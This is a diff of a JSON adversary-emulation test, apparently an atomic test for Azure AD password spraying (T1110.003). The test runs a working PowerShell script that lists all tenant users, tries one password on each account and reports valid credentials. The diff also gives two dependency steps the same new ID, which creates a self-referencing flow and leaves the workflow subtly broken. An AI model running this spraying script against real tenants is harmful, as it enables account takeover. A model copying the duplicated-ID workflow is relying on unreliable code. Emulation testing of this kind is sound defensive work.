@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "25b626fa-5bda-4903-8337-60695c19a36b",
+      "id": "12c97992-5125-5543-b93a-0c78655e417f",
       "type": "execute-command",
       "data": {
         "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n($Users = Get-AzureADUser -All $true) \u003e $null\nDisconnect-AzureAD \u003e $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2\u003e\u00261\u003e $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD \u003e $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "9e754fd7-e8f1-477a-9369-a87e53f87f40",
+      "id": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "name": "Check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "058da501-fedd-4432-8996-ddb00e148f6e",
+      "id": "1fa9d886-4e7b-5fde-9622-fecd2533f775",
       "name": "Resolve dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "5c190a38-18cc-40ad-a46c-8dacfdfc0589",
+      "id": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "name": "Re-check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "9e754fd7-e8f1-477a-9369-a87e53f87f40",
+      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "p": "on-success",
-      "o": "25b626fa-5bda-4903-8337-60695c19a36b"
+      "o": "12c97992-5125-5543-b93a-0c78655e417f"
     },
     {
-      "s": "9e754fd7-e8f1-477a-9369-a87e53f87f40",
+      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "p": "on-failure",
-      "o": "058da501-fedd-4432-8996-ddb00e148f6e"
+      "o": "1fa9d886-4e7b-5fde-9622-fecd2533f775"
     },
     {
-      "s": "058da501-fedd-4432-8996-ddb00e148f6e",
+      "s": "1fa9d886-4e7b-5fde-9622-fecd2533f775",
       "p": "on-success",
-      "o": "5c190a38-18cc-40ad-a46c-8dacfdfc0589"
+      "o": "653fec79-d5a5-51b2-adcd-921a50cf09f5"
     },
     {
-      "s": "5c190a38-18cc-40ad-a46c-8dacfdfc0589",
+      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "p": "on-failure",
-      "o": "25b626fa-5bda-4903-8337-60695c19a36b"
+      "o": "12c97992-5125-5543-b93a-0c78655e417f"
     }
   ],
   "tags": [
@@ -76,6 +76,12 @@
     "T1110.003"
   ],
   "input_arguments": [
+    {
+      "name": "valid_password",
+      "type": "string",
+      "description": "Valid password to authenticate as valid_username in the \u003cvalid_ms_account\u003e",
+      "value": "iamthebatman"
+    },
     {
       "name": "password",
       "type": "string",
@@ -87,12 +93,6 @@
       "type": "string",
       "description": "Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg \u003cvalid_test_user\u003e@\u003cvalid_ms_account.com\u003e",
       "value": "bruce.wayne@contoso.com"
-    },
-    {
-      "name": "valid_password",
-      "type": "string",
-      "description": "Valid password to authenticate as valid_username in the \u003cvalid_ms_account\u003e",
-      "value": "iamthebatman"
     }
   ]
 }
